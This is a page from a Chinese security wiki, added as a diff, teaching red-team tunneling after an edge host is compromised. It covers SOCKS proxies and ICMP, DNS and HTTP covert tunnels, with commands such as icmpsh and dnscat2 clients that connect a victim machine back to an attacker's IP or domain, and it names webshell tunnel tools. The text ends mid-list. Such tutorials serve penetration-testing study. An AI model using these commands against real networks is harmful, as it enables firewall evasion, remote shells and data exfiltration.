@@ -1,0 +1,1300 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.8">
+    
+    
+      
+        <title>代理转发与隧道 - klsfct Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.6e60f8b8.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../js/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="black" data-md-color-accent="deep-orange">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#0x01-socks" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="klsfct Docs" class="md-header__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            klsfct Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              代理转发与隧道
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      主页
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        安全wiki
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        红队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        蓝队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-tabs__link">
+        挖洞相关
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/aboutme/" class="md-tabs__link">
+        About
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="klsfct Docs" class="md-nav__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    klsfct Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        主页
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" data-md-state="indeterminate" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          安全wiki
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="安全wiki" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          安全wiki
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+        安全基础
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        web安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        数据安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/CMS%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        cms安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="md-nav__link">
+        流量分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        服务器、中间件安全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
+        应急响应
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="md-nav__link">
+        渗透测试
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" data-md-state="indeterminate" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          红队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="红队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          红队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%BC%8F%E6%B4%9E%E5%BA%93/" class="md-nav__link">
+        漏洞库
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="md-nav__link">
+        溯源分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E9%92%93%E9%B1%BC/" class="md-nav__link">
+        钓鱼
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" data-md-state="indeterminate" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          蓝队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="蓝队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          蓝队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
+        应急响应
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="md-nav__link">
+        日志分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/window实战.md" class="md-nav__link">
+        window实战
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux实战.md" class="md-nav__link">
+        linux实战
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web实战.md" class="md-nav__link">
+        web实战
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" data-md-state="indeterminate" type="checkbox" id="__nav_5" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          挖洞相关
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="挖洞相关" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          挖洞相关
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-nav__link">
+        众测项目
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/" class="md-nav__link">
+        思路方法
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" data-md-state="indeterminate" type="checkbox" id="__nav_6" checked>
+      
+      
+      
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          About
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="About" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          About
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/aboutme/" class="md-nav__link">
+        about me
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x01-socks" class="md-nav__link">
+    0x01 socks代理服务端篇
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02" class="md-nav__link">
+    0x02 隐蔽隧道篇
+  </a>
+  
+    <nav class="md-nav" aria-label="0x02 隐蔽隧道篇">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#icmp" class="md-nav__link">
+    一、ICMP隧道
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#icmp_1" class="md-nav__link">
+    关闭本地的ICMP应答
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#icmp_2" class="md-nav__link">
+    关闭本地的ICMP应答
+  </a>
+  
+    <nav class="md-nav" aria-label="关闭本地的ICMP应答">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0x03" class="md-nav__link">
+    0x03 端口转发篇
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    本地端口转发:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    远程端口转发：
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    动态端口转发
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    转发
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    删除转发
+  </a>
+  
+    <nav class="md-nav" aria-label="删除转发">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0x04-socks" class="md-nav__link">
+    0x04 socks代理客户端
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+<p>在渗透的时候通常我们通过各种漏洞获取到某内网边界机器的权限后,我们需要进行信息收集,尽可能的摸清整个内网的网络拓扑情况,在条件有限的情况时(边界机器权限低,攻击方规则不允许远程登录,边界机器为linux)我们就需要根据不同情况搭建代理,隧道,或者端口转发环境,将我们本机的工具流量带入到内网环境,对内网环境进行漫游探测</p>
+<p>通常会有以下四种情况</p>
+<ol>
+<li>内网防火墙对出口流量没有任何端口限制。</li>
+<li>内网的防火墙只配置了入站规则。</li>
+<li>内网防火墙出站入站规则都配置了。</li>
+<li>内网防火墙都配置了出入站规则并且具有协议检测和识别能力且
+仅允许HTTP流量出去外网。</li>
+</ol>
+<h3 id="0x01-socks">0x01 socks代理服务端篇<a class="headerlink" href="#0x01-socks" title="Permanent link">&para;</a></h3>
+<p>针对第一种情况,由于防火墙对出口流量没有任何端口限制,我们的可选择的方案非常灵活.常用的方法有
+1. 正向连接,将shell转发到某个端口,或者内网主机的端口或者监听SOCKS5端口开始监听,等待外面的攻击者连接(此时,外网的任何人都可以来连接被攻击者的端口)</p>
+<ol>
+<li>反向连接,受害者主机通过指定攻击者正在监听的IP和port,将shell或内网端口等转发到攻击者环境,也可实现socks5反向代理。</li>
+</ol>
+<p>其中可以用来做socks5代理的工具有:</p>
+<ol>
+<li>Frp:
+frp是一个高性能的反向代理应用,可以轻松地进行内网穿透,对外网提供服务,支
+持tcp,http,https等协议类型。
+下载地址:<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a>
+推荐文章:<a href="https://www.jianshu.com/p/e0581ee84323">https://www.jianshu.com/p/e0581ee84323</a></li>
+<li>Earthworm(ew)
+一套轻量便携且功能强大的网络穿透工具，基于标准C开发，具有socks5代理、端
+口转发和端口映射三大功能。
+下载地址:(暂不提供)
+推荐文章:<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></li>
+<li>Ssocks
+sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验
+证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代
+理服务端，反弹回本地，极大方便内网的渗透测试
+下载地址:(<a href="http://sourceforge.net/projects/ssocks/">http://sourceforge.net/projects/ssocks/</a>)
+推荐文章:<a href="https://blog.csdn.net/God_XiangYu/article/details/100132">https://blog.csdn.net/God_XiangYu/article/details/100132</a>
+929</li>
+<li>msf做socks代理
+推荐文章:<a href="https://www.cnblogs.com/dgjnszf/p/12114358.html">https://www.cnblogs.com/dgjnszf/p/12114358.html</a></li>
+<li>CobaltStrike做socks代理
+推荐文章:<a href="https://www.secshi.com/6575.htms">https://www.secshi.com/6575.htms</a></li>
+</ol>
+<p>针对第二种情况,我们可以反向连接受害者主机,通过指定攻击者
+正在监听的IP和port,将shell,内网端口等转发到攻击者因为只限制入
+站流量,出站未做限制,所以做socks代理方法依然适用</p>
+<h3 id="0x02">0x02 隐蔽隧道篇<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h3>
+<p>针 对 第 三 种 和 第 四 种 情 况 , 
+socks代理的方法就受限制,因为端口有限,我们可以选择隐蔽隧道技术
+,把内网服务器的端口通过http/https，ICMP，DNS隧道转发到本机, 
+形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接
+目标服务器内部开放端口。它利用webshell建立一个socks代理进行
+内网穿透常见的隐蔽隧道工具有以下几种。</p>
+<h4 id="icmp">一、ICMP隧道<a class="headerlink" href="#icmp" title="Permanent link">&para;</a></h4>
+<p>ICMP隧道的原理：基于IP协议，将TCP/UDP数据包封装到ICMP数据包中，绕过防火墙，实现出网。ICMP隧道的应用场景：上层协议例如HTTP协议、DNS协议和正反向端口转发都失败时，可以尝试ICMP出网。ICMP的常用工具：icmpsh、icmptunnel、ptun</p>
+<p>1、icmpsh
+工具安装
+git clone <a href="https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a> #下载地址
+apt-get install python-impacket #安装依赖
+sysctl -w net.ipv4.icmp_echo_ignore_all=1 </p>
+<h1 id="icmp_1">关闭本地的ICMP应答<a class="headerlink" href="#icmp_1" title="Permanent link">&para;</a></h1>
+<p>被攻击者执行</p>
+<p>icmpsh.exe -t 攻击者IP
+攻击者执行
+python icmpsh_m.py 攻击者IP 被攻击者IP
+2、icmptunnel
+工具安装
+git clone <a href="https://github.com/jamesbarlow/icmptunnel.git">https://github.com/jamesbarlow/icmptunnel.git</a>
+cd icmptunnel
+make
+sysctl -w net.ipv4.icmp_echo_ignore_all=1 </p>
+<h1 id="icmp_2">关闭本地的ICMP应答<a class="headerlink" href="#icmp_2" title="Permanent link">&para;</a></h1>
+<p>攻击者执行
+一个终端执行
+ ./icmptunnel –s
+另一个终端执行
+ /sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0
+被攻击者执行
+一个终端执行
+sysctl -w net.ipv4.icmp_echo_ignore_all=1 
+./icmptunnel 攻击者IP
+另一个终端执行
+/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
+ 3、ptunnel
+工具安装
+wget
+<a href="https://github.com/esrrhs/pingtunnel/releases(最新的release下载地">https://github.com/esrrhs/pingtunnel/releases(最新的release下载地</a>
+址)
+sudo unzip pingtunnel_linux64.zip
+攻击者执行
+echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all
+sudo ./pingtunnel -type server
+被攻击者执行
+// client, Forward udp
+pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t 
+SERVER_IP:4455
+// client, Forward tcp
+pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t 
+SERVER_IP:4455 -tcp 1
+// client, Forward sock5, implicitly open tcp, so no target 
+server is needed
+pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -sock5 1</p>
+<p>二、DNS隧道
+DNS隧道的原理：基于UDP协议，将TCP/UDP数据包封装到dns的
+数据包中，绕过防火墙，实现出网。
+DNS隧道的应用场景：上层协议例如HTTP协议、正反向端口转发都
+失败时，可以尝试DNS协议出网。
+DNS的常用工具：dnscat2、dns2tcp、iodine</p>
+<p>1 、 dnscat2
+工具安装
+server端安装：需要ruby环境、安装gem、ruby、dnscat2服务端
+yum install gem
+rm /usr/bin/ruby
+wget <a href="https://cache.ruby-lang.org/pub/ruby/2.5/ruby-2.5.0.tar.gz">https://cache.ruby-lang.org/pub/ruby/2.5/ruby-2.5.0.tar.gz</a>
+tar -zxvf ruby-2.5.0.tar.gz
+cd ruby-2.5.0
+mkdir -p /usr/local/ruby
+./configure --prefix=/usr/local/ruby
+make &amp;&amp; make install
+ln -s /usr/local/ruby/bin/ruby /usr/bin/ruby
+git clone <a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a>
+cd /server
+gem install bunlder
+ln /usr/local/ruby/bin/bunlder /usr/bin/bunlder
+bunlder install
+客户端安装：
+下载地主：<a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a>
+powershell客户端：<a href="https://codeload.github.com/lukebaggett/dnscat2">https://codeload.github.com/lukebaggett/dnscat2</a>
+-powershell/zip/master
+攻击者执行
+ruby dnscat2.rb yourdomain.****.top -e open -c password --no￾cache
+被攻击者执行
+./dnscat --secret=password yourdomain.target.com
+2、dns2tcp
+工具安装
+su - #进入root用户
+apt-get install update
+apt-get install dns2tcp #实际上是同时安装了dns2tcp的客户端和服务端
+windows客户端：
+<a href="https://pan.baidu.com/s/1w-dpn0US9SmfjqdXuHS4aA提取码">https://pan.baidu.com/s/1w-dpn0US9SmfjqdXuHS4aA提取码</a>: tkgd)
+攻击者执行
+dns2tcpd -f /etc/dns2tcpd.conf -F -d 2
+被攻击者执行
+./dns2tcpc.exe -r c2 -z dnsc2.test.com target_ip -l 5353 -d 2
+3、iodine
+工具安装
+sudo apt-get install iodine
+攻击者执行
+sudo iodined -c -P 123pass ClientIP(客户端IP) domain.com -DDD
+被攻击者执行
+sudo iodine -f -P 123pass serverIP(服务器IP) domain.com -r</p>
+<p>三、HTTP隧道工具篇
+HTTP隧道的原理：基于HTTP协议，将TCP/UDP数据包封装到HTTP
+的数据包中，绕过防火墙，实现出网。
+HTTP隧道的应用场景：只允许HTTP协议出网，复用WEB端口。
+HTTP隧道的常用工具：Reduh、Tunna、reGeorg、Weevely、AB
+PTTS</p>
+<ol>
+<li>Reduh
+使用条件:
+1.获取目标服务器webshell,且可以上传reDuh服务端对应脚本文件。
+2.知道目标服务器开放的内网端口,如远程桌面的端口是3389。
+3.目标服务器网络做了端口策略限制,只允许外部访问内网的80等特定端口。
+下载链接:<a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a> 
+参考链接:<a href="https://www.jianshu.com/p/cd3dae49385d">https://www.jianshu.com/p/cd3dae49385d</a></li>
+<li>Tunna
+一款神奇的工具，它可以通过HTTP封装隧道通信任何TCP，以及用于绕过防火墙环
+境中的网络限制。
+注：Tunna代理并不是非常稳定，经常出现掉线情况，尤其是使用Tunna代理远程
+连接的流量时，经常掉线。但是使用Tunna访问内网web服务还算稳定。
+下载链接:<a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a>
+参考链接:<a href="https://blog.csdn.net/limb0/article/details/103856835">https://blog.csdn.net/limb0/article/details/103856835</a></li>
+<li>reGeorg
+reGeorg是reDuh的升级版
+下载链接:<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a>
+参考链接:<a href="https://blog.csdn.net/qq_17204441/article/details/888340">https://blog.csdn.net/qq_17204441/article/details/888340</a>
+95</li>
+<li>Weevely
+weevely是一款使用python编写的webshell工具，集webshell生成和连接于一
+身，采用c/s模式构建，可以算作是linux下的一款php菜刀替代工具，具有很好的
+隐蔽性（生成随机参数且base64加密），在linux上使用时还是很给力的（集服务
+器错误配置审计，后门放置，暴力破解，文件管理，资源搜索，网络代理，命令执
+行，数据库操作，系统信息收集及端口扫描等功能）
+下载地址:<a href="http://epinna.github.com/Weevely/">http://epinna.github.com/Weevely/</a>
+参考链接:<a href="https://www.cnblogs.com/lingerhk/p/4009073.html">https://www.cnblogs.com/lingerhk/p/4009073.html</a></li>
+<li>ABPTTS
+Abptts是一款基于python2.7的http加密隧道工具，Abptts能做的很多,缺点是
+不支持PHP
+通过http加密隧道转发至目标内网下指定的单个TCP端口
+通过http加密隧道同时转发至目标内网下的多台机器上的多个tcp端口
+把ssh隧道包裹在http加密隧道中传递，对目标二级内网进行穿透
+下载地址:<a href="https://github.com/nccgroup/ABPTTS.git">https://github.com/nccgroup/ABPTTS.git</a>
